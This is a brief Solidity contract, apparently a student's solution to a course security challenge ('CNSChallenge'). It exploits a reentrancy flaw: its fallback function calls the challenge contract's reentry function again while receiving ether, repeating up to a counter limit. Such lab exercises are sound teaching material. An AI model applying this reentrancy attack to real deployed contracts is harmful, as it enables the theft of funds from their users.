pragma solidity ^0.4.22;

import "./CNSChallenge.sol";

contract CNSReentry {
    uint count = 0;
    string id = "ntnu_40747040s";

    function attack(string studentID) public {
        count += 1;
        CNSChallenge(msg.sender).reentry(studentID);
    }

    function () public payable {
        if (count < 2) {
            count += 1;
            CNSChallenge(msg.sender).reentry(id);
        }
    }
}